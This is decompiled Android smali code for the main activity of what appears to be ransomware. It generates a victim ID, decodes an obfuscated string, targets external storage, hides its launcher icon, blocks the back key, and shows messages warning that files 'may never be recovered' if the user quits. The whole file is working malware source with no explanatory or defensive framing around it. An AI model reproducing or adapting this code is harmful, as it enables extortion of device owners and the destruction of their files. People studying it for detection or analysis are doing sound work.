.class public Lcom/android/tencent/zdevs/bah/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/tencent/zdevs/bah/MainActivity$100000000;
    }
.end annotation


# static fields
.field static fi:Ljava/io/File;

.field static hz:Ljava/lang/String;

.field static hzs:I

.field public static instance:Lcom/android/tencent/zdevs/bah/MainActivity;

.field static m:Ljava/lang/String;


# instance fields
.field def:Landroid/content/ComponentName;

.field mBazaar:Landroid/content/ComponentName;

.field mP:Landroid/content/pm/PackageManager;

.field xh:Ljava/lang/String;


# direct methods
.method static final constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    check-cast v2, Lcom/android/tencent/zdevs/bah/MainActivity;

    sput-object v2, Lcom/android/tencent/zdevs/bah/MainActivity;->instance:Lcom/android/tencent/zdevs/bah/MainActivity;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 125
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private disableComponent(Landroid/content/ComponentName;)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ComponentName;",
            ")V"
        }
    .end annotation

    .prologue
    .line 120
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/android/tencent/zdevs/bah/MainActivity;->mP:Landroid/content/pm/PackageManager;

    move-object v4, v1

    const/4 v5, 0x2

    const/4 v6, 0x1

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method private enabledComponent(Landroid/content/ComponentName;)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ComponentName;",
            ")V"
        }
    .end annotation

    .prologue
    .line 117
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    iget-object v3, v3, Lcom/android/tencent/zdevs/bah/MainActivity;->mP:Landroid/content/pm/PackageManager;

    move-object v4, v1

    const/4 v5, 0x1

    const/4 v6, 0x1

    invoke-virtual {v3, v4, v5, v6}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    return-void
.end method

.method private setIconSc()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 124
    move-object v0, p0

    move-object v2, v0

    move-object v3, v0

    iget-object v3, v3, Lcom/android/tencent/zdevs/bah/MainActivity;->def:Landroid/content/ComponentName;

    invoke-direct {v2, v3}, Lcom/android/tencent/zdevs/bah/MainActivity;->disableComponent(Landroid/content/ComponentName;)V

    .line 125
    move-object v2, v0

    move-object v3, v0

    iget-object v3, v3, Lcom/android/tencent/zdevs/bah/MainActivity;->mBazaar:Landroid/content/ComponentName;

    invoke-direct {v2, v3}, Lcom/android/tencent/zdevs/bah/MainActivity;->enabledComponent(Landroid/content/ComponentName;)V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v6, v0

    const-string v7, "com.aide.ui"

    invoke-static {v6, v7}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 30
    move-object v6, v0

    invoke-virtual {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->getWindow()Landroid/view/Window;

    move-result-object v6

    const/16 v7, 0x2080

    invoke-virtual {v6, v7}, Landroid/view/Window;->addFlags(I)V

    .line 31
    move-object v6, v0

    move-object v7, v0

    invoke-virtual {v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-virtual {v7}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v7

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/MainActivity;->mP:Landroid/content/pm/PackageManager;

    .line 32
    move-object v6, v0

    new-instance v7, Landroid/content/ComponentName;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    move-object v9, v0

    invoke-virtual {v9}, Lcom/android/tencent/zdevs/bah/MainActivity;->getBaseContext()Landroid/content/Context;

    move-result-object v9

    const-string v10, "com.android.tencent.zdevs.bah.MainActivity"

    invoke-direct {v8, v9, v10}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/MainActivity;->def:Landroid/content/ComponentName;

    .line 33
    move-object v6, v0

    new-instance v7, Landroid/content/ComponentName;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    move-object v9, v0

    invoke-virtual {v9}, Lcom/android/tencent/zdevs/bah/MainActivity;->getBaseContext()Landroid/content/Context;

    move-result-object v9

    const-string v10, "com.android.tencent.zdevs.bah.QQ1279525738"

    invoke-direct {v8, v9, v10}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/MainActivity;->mBazaar:Landroid/content/ComponentName;

    .line 35
    move-object v6, v0

    move-object v7, v1

    invoke-super {v6, v7}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 36
    move-object v6, v0

    const v7, 0x7f030024

    invoke-virtual {v6, v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->setContentView(I)V

    .line 37
    move-object v6, v0

    sput-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->instance:Lcom/android/tencent/zdevs/bah/MainActivity;

    .line 38
    move-object v6, v0

    invoke-virtual {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    const v7, 0x7f060070

    new-instance v8, Lcom/android/tencent/zdevs/bah/bah;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    invoke-direct {v9}, Lcom/android/tencent/zdevs/bah/bah;-><init>()V

    invoke-virtual {v6, v7, v8}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    move-result v6

    .line 39
    move-object v6, v0

    const-string v7, "XH"

    const/4 v8, 0x0

    invoke-virtual {v6, v7, v8}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    move-object v3, v6

    .line 40
    move-object v6, v3

    const-string v7, "bah"

    const-string v8, ""

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_1

    .line 41
    move-object v6, v0

    move-object v7, v3

    const-string v8, "bah"

    const-string v9, ""

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/MainActivity;->xh:Ljava/lang/String;

    .line 49
    :goto_0
    new-instance v6, Ljava/lang/StringBuffer;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, "\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1790\u17d7\u1782\u179a\u17d0\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17d0\u17d7\u1782\u179a\u17d7\u17d7\u1782\u179a\u17cc\u17d7\u1782\u179a\u17d1\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17da\u17d7\u1782\u179a\u17d4\u17d7\u1782\u179a\u17db\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17a8\u1782\u1796\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17e9\u17d6\u17b9\u1786\u17d7\u17d5\u17b9\u17a4\u178b\u17d5\u17b9\u17a4\u1799\u17d6\u17a8\u17a4\u17d1\u17d6\u17a8\u1786\u179b\u17d7\u1782\u179a\u1784\u17e9"

    invoke-static {v7}, Lcom/android/tencent/zdevs/bah/sss;->l(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/MainActivity;->xh:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    sput-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->hz:Ljava/lang/String;

    .line 51
    new-instance v6, Ljava/lang/StringBuffer;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    move-object v7, v0

    iget-object v7, v7, Lcom/android/tencent/zdevs/bah/MainActivity;->xh:Ljava/lang/String;

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    const/16 v8, 0x8

    mul-int/lit8 v7, v7, 0x8

    const/16 v8, 0xd

    add-int/lit8 v7, v7, -0xd

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    sput-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->m:Ljava/lang/String;

    .line 52
    sget-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->hz:Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v6

    sput v6, Lcom/android/tencent/zdevs/bah/MainActivity;->hzs:I

    .line 53
    new-instance v6, Ljava/io/File;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v8

    const-string v9, "/"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    sput-object v6, Lcom/android/tencent/zdevs/bah/MainActivity;->fi:Ljava/io/File;

    .line 54
    move-object v6, v3

    const-string v7, "cs"

    const/4 v8, 0x0

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v6

    const/4 v7, 0x2

    if-lt v6, v7, :cond_0

    .line 55
    move-object v6, v0

    const-string v7, "Lycorisradiata"

    invoke-virtual {v6, v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 56
    move-object v6, v0

    invoke-virtual {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    const v7, 0x7f060070

    new-instance v8, Lcom/android/tencent/zdevs/bah/qq1279525738;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    invoke-direct {v9}, Lcom/android/tencent/zdevs/bah/qq1279525738;-><init>()V

    invoke-virtual {v6, v7, v8}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    move-result v6

    .line 57
    move-object v6, v0

    invoke-static {v6}, Lcom/android/tencent/zdevs/bah/sss;->bz(Landroid/content/Context;)V

    .line 59
    :cond_0
    move-object v6, v3

    const-string v7, "sss"

    const/4 v8, 0x0

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v6

    const/4 v7, 0x0

    if-ne v6, v7, :cond_2

    .line 60
    new-instance v6, Ljava/lang/Thread;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    new-instance v8, Lcom/android/tencent/zdevs/bah/MainActivity$100000000;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/android/tencent/zdevs/bah/MainActivity$100000000;-><init>(Lcom/android/tencent/zdevs/bah/MainActivity;)V

    invoke-direct {v7, v8}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v6}, Ljava/lang/Thread;->start()V

    .line 70
    :goto_1
    return-void

    .line 44
    :cond_1
    move-object v6, v0

    new-instance v7, Ljava/lang/StringBuffer;

    move-object v12, v7

    move-object v7, v12

    move-object v8, v12

    invoke-direct {v8}, Ljava/lang/StringBuffer;-><init>()V

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v8

    const v10, 0xf4240

    int-to-double v10, v10

    mul-double/2addr v8, v10

    double-to-int v8, v8

    const v9, 0x989680

    add-int/2addr v8, v9

    invoke-virtual {v7, v8}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v6, Lcom/android/tencent/zdevs/bah/MainActivity;->xh:Ljava/lang/String;

    .line 45
    move-object v6, v3

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    move-object v4, v6

    .line 46
    move-object v6, v4

    const-string v7, "bah"

    move-object v8, v0

    iget-object v8, v8, Lcom/android/tencent/zdevs/bah/MainActivity;->xh:Ljava/lang/String;

    invoke-interface {v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    .line 47
    move-object v6, v4

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v6

    goto/16 :goto_0

    .line 67
    :cond_2
    move-object v6, v0

    const-string v7, "Lycorisradiata"

    invoke-virtual {v6, v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 68
    move-object v6, v0

    invoke-virtual {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    const v7, 0x7f060070

    new-instance v8, Lcom/android/tencent/zdevs/bah/qq1279525738;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    invoke-direct {v9}, Lcom/android/tencent/zdevs/bah/qq1279525738;-><init>()V

    invoke-virtual {v6, v7, v8}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v6

    invoke-virtual {v6}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    move-result v6

    .line 69
    move-object v6, v0

    invoke-static {v6}, Lcom/android/tencent/zdevs/bah/sss;->bz(Landroid/content/Context;)V

    .line 70
    move-object v6, v0

    invoke-direct {v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->setIconSc()V

    goto :goto_1
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 10

    .prologue
    .line 104
    move-object v0, p0

    move v1, p1

    move-object v2, p2

    move v7, v1

    const/4 v8, 0x4

    if-ne v7, v8, :cond_0

    .line 105
    move-object v7, v0

    invoke-virtual {v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v7

    const v8, 0x7f060070

    invoke-virtual {v7, v8}, Landroid/support/v4/app/FragmentManager;->findFragmentById(I)Landroid/support/v4/app/Fragment;

    move-result-object v7

    check-cast v7, Landroid/support/v4/app/Fragment;

    move-object v5, v7

    .line 107
    move-object v7, v5

    instance-of v7, v7, Lcom/android/tencent/zdevs/bah/bah;

    if-eqz v7, :cond_1

    .line 108
    const-string v7, "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01"

    move-object v4, v7

    .line 112
    :goto_0
    move-object v7, v0

    move-object v8, v4

    const/4 v9, 0x1

    invoke-static {v7, v8, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v7

    invoke-virtual {v7}, Landroid/widget/Toast;->show()V

    .line 114
    :cond_0
    const/4 v7, 0x1

    move v0, v7

    return v0

    .line 110
    :cond_1
    const-string v7, "Please do not quit the software, or the file may never be recovered!"

    move-object v4, v7

    goto :goto_0
.end method

.method protected onPause()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 90
    move-object v0, p0

    move-object v7, v0

    invoke-virtual {v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v7

    const v8, 0x7f060070

    invoke-virtual {v7, v8}, Landroid/support/v4/app/FragmentManager;->findFragmentById(I)Landroid/support/v4/app/Fragment;

    move-result-object v7

    check-cast v7, Landroid/support/v4/app/Fragment;

    move-object v2, v7

    .line 91
    move-object v7, v2

    instance-of v7, v7, Lcom/android/tencent/zdevs/bah/bah;

    if-eqz v7, :cond_0

    .line 92
    move-object v7, v0

    const-string v8, "XH"

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v7

    move-object v3, v7

    .line 93
    move-object v7, v3

    invoke-interface {v7}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    move-object v4, v7

    .line 94
    move-object v7, v3

    const-string v8, "cs"

    const/4 v9, 0x0

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v7

    move v5, v7

    .line 95
    move-object v7, v4

    const-string v8, "cs"

    move v9, v5

    const/4 v10, 0x1

    add-int/lit8 v9, v9, 0x1

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v7

    .line 96
    move-object v7, v4

    invoke-interface {v7}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v7

    .line 97
    move-object v7, v0

    const-string v8, "\u914d\u7f6e\u6587\u4ef6\u4e2d \u8bf7\u52ff\u9000\u51fa\uff01"

    const/4 v9, 0x1

    invoke-static {v7, v8, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v7

    invoke-virtual {v7}, Landroid/widget/Toast;->show()V

    .line 101
    :goto_0
    move-object v7, v0

    invoke-super {v7}, Landroid/support/v4/app/FragmentActivity;->onPause()V

    return-void

    .line 99
    :cond_0
    move-object v7, v0

    const-string v8, "Please do not quit the software, or the file may never be recovered!"

    const/4 v9, 0x1

    invoke-static {v7, v8, v9}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v7

    invoke-virtual {v7}, Landroid/widget/Toast;->show()V

    goto :goto_0
.end method

.method protected onResume()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 77
    move-object v0, p0

    move-object v5, v0

    invoke-virtual {v5}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v5

    const v6, 0x7f060070

    invoke-virtual {v5, v6}, Landroid/support/v4/app/FragmentManager;->findFragmentById(I)Landroid/support/v4/app/Fragment;

    move-result-object v5

    check-cast v5, Landroid/support/v4/app/Fragment;

    move-object v2, v5

    .line 78
    move-object v5, v2

    instance-of v5, v5, Lcom/android/tencent/zdevs/bah/bah;

    if-eqz v5, :cond_0

    .line 79
    move-object v5, v0

    const-string v6, "XH"

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    move-object v3, v5

    .line 80
    move-object v5, v3

    const-string v6, "cs"

    const/4 v7, 0x0

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v5

    const/4 v6, 0x2

    if-lt v5, v6, :cond_0

    .line 81
    move-object v5, v0

    const-string v6, "Lycorisradiata"

    invoke-virtual {v5, v6}, Lcom/android/tencent/zdevs/bah/MainActivity;->setTitle(Ljava/lang/CharSequence;)V

    .line 82
    move-object v5, v0

    invoke-virtual {v5}, Lcom/android/tencent/zdevs/bah/MainActivity;->getSupportFragmentManager()Landroid/support/v4/app/FragmentManager;

    move-result-object v5

    invoke-virtual {v5}, Landroid/support/v4/app/FragmentManager;->beginTransaction()Landroid/support/v4/app/FragmentTransaction;

    move-result-object v5

    const v6, 0x7f060070

    new-instance v7, Lcom/android/tencent/zdevs/bah/qq1279525738;

    move-object v9, v7

    move-object v7, v9

    move-object v8, v9

    invoke-direct {v8}, Lcom/android/tencent/zdevs/bah/qq1279525738;-><init>()V

    invoke-virtual {v5, v6, v7}, Landroid/support/v4/app/FragmentTransaction;->replace(ILandroid/support/v4/app/Fragment;)Landroid/support/v4/app/FragmentTransaction;

    move-result-object v5

    invoke-virtual {v5}, Landroid/support/v4/app/FragmentTransaction;->commit()I

    move-result v5

    .line 85
    :cond_0
    move-object v5, v0

    invoke-super {v5}, Landroid/support/v4/app/FragmentActivity;->onResume()V

    return-void
.end method
